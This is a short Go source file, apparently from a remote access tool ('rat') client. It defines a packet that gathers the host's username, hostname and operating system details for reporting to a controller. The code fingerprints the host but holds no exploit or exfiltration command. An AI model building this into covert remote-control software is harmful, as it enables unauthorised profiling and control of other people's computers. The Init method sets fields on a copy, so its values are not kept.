package main

import (
	"oslib"
	"rat/client/computer"
	"rat/common"
)

type ComputerInfoPacket struct {
	Username                   string
	Hostname                   string
	OperatingSystemName        string
	OperatingSystemDisplayName string
}

func (packet ComputerInfoPacket) Header() common.PacketHeader {
	return common.ComputerInfoHeader
}

func (packet ComputerInfoPacket) Init() {
	u := computer.GetComputerInformation()

	packet.Username = u.Username
	packet.Hostname = u.Hostname
	packet.OperatingSystemName = oslib.Name
	packet.OperatingSystemDisplayName = oslib.GetDisplay()
}
